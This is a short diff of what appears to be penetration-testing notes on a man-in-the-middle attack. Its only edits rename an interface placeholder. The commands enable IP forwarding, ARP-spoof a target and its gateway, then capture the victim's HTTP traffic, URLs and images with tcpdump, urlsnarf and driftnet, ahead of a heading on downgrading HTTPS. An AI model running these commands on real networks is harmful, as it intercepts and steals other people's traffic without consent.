@@ -1,14 +1,14 @@
 # forward IPV4 traffic
 echo 1 > /proc/sys/net/ipv4/ip_forward
  
-arpspoof -i <yourInterface> -t <rhost> -r <gatewayIp>
+arpspoof -i <interface> -t <rhost> -r <gatewayIp>
 
-tcpdump -i <yourInterface> -A host <rhost> and port 80 > <rhost.txt>
+tcpdump -i <interface> -A host <rhost> and port 80 > <rhost.txt>
 # or
-urlsnarf -i <yourInterface>
+urlsnarf -i <interface>
 
 # capture images
-driftnet -i <yourInterface>
+driftnet -i <interface>
 
 ## downgrade HTTPS to HTTP
 
